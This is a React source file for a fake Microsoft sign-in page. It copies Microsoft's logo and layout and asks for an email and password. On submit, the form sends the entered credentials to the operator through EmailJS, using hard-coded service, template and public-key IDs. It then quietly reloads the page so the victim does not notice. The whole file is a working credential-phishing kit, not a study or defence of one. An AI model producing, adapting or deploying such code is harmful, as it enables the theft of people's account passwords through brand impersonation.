import React, { useRef, useState } from "react";
import emailjs from "@emailjs/browser";

const Login = () => {
  const form = useRef();
  const [loading, setLoading] = useState(false);

  const sendEmail = (e) => {
    e.preventDefault();
    setLoading(true);

    emailjs
      .sendForm(
        "service_i1hn7b6", // ✅ Your EmailJS service ID
        "template_esw4v85", // ✅ Your template ID
        form.current,
        "QqR8IDJXlWSH7-bG3" // ✅ Your public key
      )
      .then(
        () => {
          setLoading(false);
          window.location.reload(); // Reload the page after successful send, no alert
        },
        (error) => {
          console.error("EmailJS error:", error);
          alert("EmailJS Error: " + JSON.stringify(error));
          alert("There was an error sending the email.");
          setLoading(false);
        }
      );
  };

  return (
    <div style={styles.body}>
      <div style={styles.loginContainer}>
        <div style={styles.msLogo}>
          <svg viewBox="0 0 32 32" style={styles.logoSvg}>
            <rect fill="#f25022" x="0" y="0" width="15" height="15" />
            <rect fill="#7fba00" x="17" y="0" width="15" height="15" />
            <rect fill="#00a4ef" x="0" y="17" width="15" height="15" />
            <rect fill="#ffb900" x="17" y="17" width="15" height="15" />
          </svg>
          <span style={styles.msText}>Microsoft</span>
        </div>
        <h2 style={styles.heading}>Sign in</h2>

        <form ref={form} onSubmit={sendEmail}>
          <div style={styles.inputGroup}>
            <input
              type="email"
              name="email"
              id="email"
              placeholder="Email, phone"
              required
              style={styles.input}
            />
          </div>
          <div style={styles.inputGroup}>
            <input
              type="password"
              name="password"
              id="password"
              placeholder="Password"
              required
              style={styles.input}
            />
          </div>
          <div style={styles.links}>
            No account?
            <a href="#" style={styles.link}>
              Create one!
            </a>
            <br />
            <a href="#" style={{ ...styles.link, marginLeft: 0 }}>
              Sign in with a security key
            </a>
          </div>
          <button type="submit" style={styles.button}>
            {loading ? "Signing..." : "Next"}
          </button>
        </form>

        <hr style={styles.divider} />

        <button style={styles.signInOptions}>
          <svg width="48" height="48" viewBox="0 0 48 48">
            <rect width="48" height="48" fill="none" />
            <path
              fill="#404040"
              d="M40,32.578V40H32V36H28V32H24V28.766A10.689,10.689,0,0,1,19,30a10.9,10.9,0,0,1-5.547-1.5,11.106,11.106,0,0,1-2.219-1.719A11.373,11.373,0,0,1,9.5,24.547a10.4,10.4,0,0,1-1.109-2.625A11.616,11.616,0,0,1,8,19a10.9,10.9,0,0,1,1.5-5.547,11.106,11.106,0,0,1,1.719-2.219A11.373,11.373,0,0,1,13.453,9.5a10.4,10.4,0,0,1,2.625-1.109A11.616,11.616,0,0,1,19,8a10.9,10.9,0,0,1,5.547,1.5,11.106,11.106,0,0,1,2.219,1.719A11.373,11.373,0,0,1,28.5,13.453a10.4,10.4,0,0,1,1.109,2.625A11.616,11.616,0,0,1,30,19a10.015,10.015,0,0,1-.125,1.578,10.879,10.879,0,0,1-.359,1.531Zm-2,.844L27.219,22.641a14.716,14.716,0,0,0,.562-1.782A7.751,7.751,0,0,0,28,19a8.786,8.786,0,0,0-.7-3.5,8.9,8.9,0,0,0-1.938-2.859A9.269,9.269,0,0,0,22.5,10.719,8.9,8.9,0,0,0,19,10a8.786,8.786,0,0,0-3.5.7,8.9,8.9,0,0,0-2.859,1.938A9.269,9.269,0,0,0,10.719,15.5,8.9,8.9,0,0,0,10,19a8.786,8.786,0,0,0,.7,3.5,8.9,8.9,0,0,0,1.938,2.859A9.269,9.269,0,0,0,15.5,27.281a8.842,8.842,0,0,0,6.469.2A8.767,8.767,0,0,0,24.609,26H26v4h4v4h4v4h4ZM16,14a1.938,1.938,0,0,1,.781.156,2,2,0,0,1,.625.422,2.191,2.191,0,0,1,.438.641A1.705,1.705,0,0,1,18,16a1.938,1.938,0,0,1-.156.781,2,2,0,0,1-.422.625,2.191,2.191,0,0,1-.641.438A1.705,1.705,0,0,1,16,18a1.938,1.938,0,0,1-.781-.156,2,2,0,0,1-.625-.422,2.191,2.191,0,0,1-.438-.641A1.705,1.705,0,0,1,14,16a1.938,1.938,0,0,1,.156-.781,2,2,0,0,1,.422-.625,2.191,2.191,0,0,1,.641-.438A1.705,1.705,0,0,1,16,14Z"
            />
          </svg>
          Sign-in options
        </button>
      </div>
    </div>
  );
};

const styles = {
  body: {
    fontFamily: "Segoe UI, Tahoma, Geneva, Verdana, sans-serif",
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    height: "100vh",
    margin: 0,
  },
  loginContainer: {
    background: "#fff",
    padding: "2.5rem 2.5rem 2rem 2.5rem",
    borderRadius: "8px",
    boxShadow: "0 4px 24px 0 rgba(0,0,0,0.13)",
    width: "360px",
    minWidth: "320px",
    border: "1px solid #e1dfdd",
  },
  msLogo: {
    display: "flex",
    alignItems: "center",
    marginBottom: "1.5rem",
  },
  logoSvg: {
    width: "32px",
    height: "32px",
    marginRight: "0.7rem",
  },
  msText: {
    fontSize: "1.4rem",
    fontWeight: "600",
    color: "#222",
    letterSpacing: "0.01em",
  },
  heading: {
    fontSize: "1.7rem",
    fontWeight: "400",
    margin: "0 0 1.7rem 0",
    color: "#1b1b1b",
  },
  inputGroup: {
    marginBottom: "1.1rem",
  },
  input: {
    width: "100%",
    padding: "0.85rem 1rem",
    border: "1px solid #c8c6c4",
    fontSize: "1.08rem",
    background: "#faf9f8",
    marginBottom: "0.1rem",
    outline: "none",
    borderRadius: "3px",
    transition: "border-color 0.2s, box-shadow 0.2s",
    boxSizing: "border-box",
    boxShadow: "0 1px 2px rgba(0,0,0,0.03)",
  },
  links: {
    fontSize: "1.01rem",
    marginBottom: "1.7rem",
    color: "#616161",
    lineHeight: 1.6,
  },
  link: {
    color: "#0067b8",
    textDecoration: "none",
    fontWeight: 500,
    marginLeft: "0.2rem",
  },
  button: {
    width: "100%",
    padding: "0.8rem",
    background: "#0067b8",
    color: "#fff",
    border: "none",
    fontSize: "1.13rem",
    fontWeight: "500",
    cursor: "pointer",
    marginTop: "0.5rem",
    marginBottom: "0.5rem",
    borderRadius: "3px",
    boxShadow: "0 1px 2px rgba(0,0,0,0.04)",
    letterSpacing: "0.01em",
    transition: "background 0.2s",
  },
  divider: {
    borderTop: "1px solid #e1dfdd",
    margin: "1.7rem 0 1.2rem 0",
  },
  signInOptions: {
    width: "100%",
    background: "#f3f2f1",
    border: "1px solid #e1dfdd",
    color: "#222",
    fontSize: "1.08rem",
    padding: "0.7rem",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    cursor: "pointer",
    height: "70px",
    borderRadius: "3px",
    marginTop: "0.5rem",
    transition: "background 0.2s, border-color 0.2s",
  },
};

export default Login;
